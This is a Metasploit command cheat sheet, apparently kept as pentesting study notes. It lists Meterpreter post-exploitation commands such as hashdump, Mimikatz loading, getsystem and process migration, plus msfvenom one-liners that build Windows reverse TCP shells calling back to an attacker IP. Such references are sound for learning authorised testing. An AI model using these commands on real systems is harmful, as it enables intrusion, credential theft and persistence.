# Metasploit Command Syntax

<p align="center"><img alt="Metasploit Logo" src="https://miro.medium.com/v2/resize:fit:1400/1*waFDh88WH0YeIK3xMP6TjA.png" width=500 /></p>

Metasploit or the Metasploit Framework is a tool that is used to develop and execute exploit code agains remote target machines. Since this tool is very large, a separate document for its commands seemed appropriate.

</br>

## Table of Contents

- [Main commands to use MetaSploit](#main-commands-to-use-metasploit)
- [Other usefull commands](#other-usefull-commands)
- [Metasploit Modules](#metasploit-modules)
- [MSFVenom Commands](#msfvenom-commands)
- [Database/workspaces](#databaseworkspaces)

> [!NOTE]
> Some of these commands can only be used after a (meterpreter) shell has been made to another machine. These will be marked with a 💲. Others must be used outside of these shells.

<br>

## Main commands to use MetaSploit

```
search                 > Look for a module to use
use                    > Load the specific module
options                > View any options you need to set
set <options>          > Set the specified option
run                    > Run the exploit
exploit                > Run the exploit
```

<br>

## Other usefull commands

#### 💲 Information gathering

```
getuid                 > Get the current user
getprivs               > Get the priveleges for the current user
sysinfo                > Get info on the system
```

#### 💲 Kiwi/Mimikatz can be loaded into the session

```
load kiwi              > help now shows more commands
```

#### 💲 Menu, go back to from session

```
background
```

#### 💲 Move/migrate to another process (for priveleges)

```
migrate -N <process name>
```

#### 💲 Passwords

```
hashdump                > Dumps all the hashes available on a computer when the required priveleges are met.
```

#### Payloads

```
show payloads           > When a module is selected it will list compatible payloads
set payload <id>        > Selects the listed payload with the corresponding number.
set payload <name>      > Selects the payload with the corresponding name.
```

#### 💲 Privelege escalataion (for Windows at least)

```
getsystem               > when in a meterpreter session
```

#### 💲 Quiting or closing a session

```
quit 				
```

#### Search exploits

```
use post/multi/recon/local_exploit_suggester        > Can be used to find any vulnerabilities on the system. Does need an active session.
```

#### Searching for modules

```
search <keyword 1> <kayword 2> ...
```

#### Sessions

```
sessions                > show all
sessions -i <id>        > select and go to session
sessions -u             > upgrade shel to meterpreter shell
sessions -k <id>        > kill selected session
```

#### 💲 Shell creation after exploiting

```
shell                             > 
```

#### Shell conversion to Meterpreter

```
post/multi/manage/shell_to_meterpreter          > Converts a regular shell to a meterpreter session
```

#### Show various possibilities (payloads/exploits etc.)

```
show payloads                      > show payloads
show exploits                      > show exploits
show -h                            > show help
```

<br>

## Metasploit Modules

Some usefull modules that can be used in Metasploit.

```
run post/windows/manage/migrate

> Run the migrate module that can be used to inject into another process to create persistence
```

<br>

##  MSFVenom Commands

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c

> Creates a unstaged reverse TCP shell in c format, to be used on a 32-bit windows system.
> Attack host IP and port are also included. 


msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe

> Creates an unstaged reverse TCP shell in exe format to be used on a 64-bit windows system.
> Attack host IP and port are also included as well as an output name.
```

🔰 msfvenom argument | ℹ️ Function
-- | --
**`-a`** | Specifies an architecture type of the machine the payload will be used
**`-p`** | Specifies the payload (type) to be used
**`--platform`** | Specifies the platform of the machine the payload will be used
**`-l / --list formats`** | Show all available formats
**`-l / --list payloads`** | Show all available payloads
**`-e`** | Specifies the encoding format
**`-f`** | Specifies the output format (extension)
**`-o`** | Specifies the output location
**`-b`** | A list of characters to avoid

<br>

## Database/workspaces

#### Outside of Metasploit

```
systemctl start postgresql      > Start postgreSQL used by Metasploit
sudo msfdb init                 > start Metasploit database
```

#### Inside metasploit

```
db_status                       > Check database status
```

#### Workspaces

```
workspace                       > List workspaces
workspace -a tryhackme          > Add workspace
workspace default               > Select workspace
```

```
set hosts -R                    > Setting an RHOSTS options as the one stored in the database
```



<!--- 

💲 ❕ ➡️

## TITLE

### Usefull documentation

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

### Related tools

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

--->
